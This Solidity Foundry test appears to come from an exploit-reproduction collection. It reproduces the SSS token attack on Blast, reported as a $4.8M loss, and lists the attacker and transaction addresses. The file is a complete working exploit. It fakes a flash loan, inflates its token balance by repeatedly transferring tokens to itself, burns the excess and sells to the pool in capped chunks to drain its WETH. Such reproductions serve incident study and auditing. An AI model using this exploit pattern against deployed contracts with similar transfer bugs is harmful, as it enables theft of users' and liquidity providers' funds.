// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../basetest.sol";
import "./../interface.sol";
// @KeyInfo - Total Lost: $4.8M
// Attacker: 0x6a89a8C67B5066D59BF4D81d59f70C3976faCd0A
// Attack Contract: 0xDed85d83Bf06069c0bD5AA792234b5015D5410A9
// Vulnerable Contract: 0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed
// Attack Tx: https://blastscan.io/tx/0x62e6b906bb5aafdc57c72cd13e20a18d2de3a4a757cd2f24fde6003ce5c9f2c6

// @Analyses
// https://twitter.com/SSS_HQ/status/1771054306520867242
// https://twitter.com/dot_pengun/status/1770989208125272481

interface ISSS is IERC20 {
    function maxAmountPerTx() external view returns (uint256);
    function burn(uint256) external;
}

contract SSSExploit is BaseTestWithBalanceLog {
    address private constant POOL = 0x92F32553cC465583d432846955198F0DDcBcafA1;
    IWETH private constant WETH = IWETH(payable(0x4300000000000000000000000000000000000004));
    ISSS private constant SSS = ISSS(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
    Uni_Router_V2 private constant ROUTER_V2 = Uni_Router_V2(0x98994a9A7a2570367554589189dC9772241650f6);
    Uni_Pair_V2 private sssPool = Uni_Pair_V2(POOL);

    uint256 ethFlashAmt = 1 ether;
    uint256 expectedETHAfter = 1393.20696066122859944 ether;

    function setUp() public {
        vm.createSelectFork("blast", 1_110_245);
        WETH.approve(address(ROUTER_V2), type(uint256).max);
        SSS.approve(address(ROUTER_V2), type(uint256).max);
        fundingToken = address(WETH);
    }

    function getPath(bool buy) internal view returns (address[] memory path) {
        path = new address[](2);
        path[0] = buy ? address(WETH) : address(SSS);
        path[1] = buy ? address(SSS) : address(WETH);
    }

    function testExploit() public balanceLog {

        //Emulate flashloan here with deal
        vm.deal(address(this), 0);
        vm.deal(address(this), ethFlashAmt);
        WETH.deposit{value: ethFlashAmt}();

        //Buy 1 eth of tokens
        ROUTER_V2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ethFlashAmt, 0, getPath(true), address(this), block.timestamp
        );

        //Transfer to self until balance reaches target bal
        uint256 targetBal = ROUTER_V2.getAmountsIn(WETH.balanceOf(POOL) - 29.5 ether, getPath(false))[0];
        while (SSS.balanceOf(address(this)) < targetBal) {
            SSS.transfer(address(this), SSS.balanceOf(address(this)));
        }

        //Burn excess tokens above target to avoid OVERFLOW error on swap on pair
        SSS.burn(SSS.balanceOf(address(this)) - targetBal);
        assertEq(SSS.balanceOf(address(this)), targetBal, "we exceeded target");

        //Send balance of tokens to pair to swap in a loop,to avoid multiple swap calls
        uint256 tokensLeft = targetBal;
        uint256 maxAmountPerTx = SSS.maxAmountPerTx();
        uint256 SBalBeforeOnPair = SSS.balanceOf(POOL);
        while (tokensLeft > 0) {
            uint256 toSell = tokensLeft > maxAmountPerTx ? maxAmountPerTx - 1 : tokensLeft;
            SSS.transfer(POOL, toSell);
            tokensLeft -= toSell;
        }

        //Use swap function in pool to swap to weth
        uint256 targetETH = ROUTER_V2.getAmountsOut(SSS.balanceOf(POOL) - SBalBeforeOnPair, getPath(false))[1];
        sssPool.swap(targetETH, 0, address(this), new bytes(0));

        //Emulate paying back flashloan
        WETH.transfer(address(1), ethFlashAmt);

        assertEq(WETH.balanceOf(address(this)), expectedETHAfter, "Not expected WETH BAL");
        assertEq(SSS.balanceOf(address(this)), 0, "All SSS tokens didn't get sold");
    }
}
